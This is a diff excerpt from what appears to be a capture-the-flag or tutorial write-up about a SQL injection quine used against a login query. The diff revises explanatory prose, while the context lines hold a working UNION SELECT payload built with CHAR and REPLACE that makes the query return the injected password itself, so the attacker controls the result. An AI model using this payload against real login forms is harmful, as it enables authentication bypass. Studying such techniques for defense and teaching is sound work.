@@ -275,9 +275,11 @@ SELECT * FROM users WHERE username = 'testtt"\'' AND password = ' UNION SELECT C
 ```python
 ('testtt"\'', ' UNION SELECT CHAR(116,101,115,116,116,116,34,39), REPLACE(REPLACE(REPLACE(" UNION SELECT CHAR(116,101,115,116,116,116,34,39), REPLACE(REPLACE(REPLACE(\'$\',CHAR(39),CHAR(34)),CHAR(36),\'$\'), CHAR(92), CHAR());-- -",CHAR(39),CHAR(34)),CHAR(36)," UNION SELECT CHAR(116,101,115,116,116,116,34,39), REPLACE(REPLACE(REPLACE(\'$\',CHAR(39),CHAR(34)),CHAR(36),\'$\'), CHAR(92), CHAR());-- -"), CHAR(92), CHAR());-- -')
 ```
-#### notice that the result from the qeury is from the quine in the password field , that is mean the first elemnt in the result is from the sentence `UNION SELECT CHAR(116,101,115,116,116,116,34,39)` and the seconed elemnt where the `$$` was placed is the quine returning itself
+#### Notice that the result from the qeury is from the quine in the password field , that is mean the first element in the result is from the sentence `UNION SELECT CHAR(116,101,115,116,116,116,34,39)` and the seconed elemnt where the `$$` was placed is the quine returning itself (the entire password paramter again)
 
-##### Great now we control the username output !!!
+#### So it works because the first element == username  and seconed element == password
+
+#### Great now we control the username output !!!
 
 
 
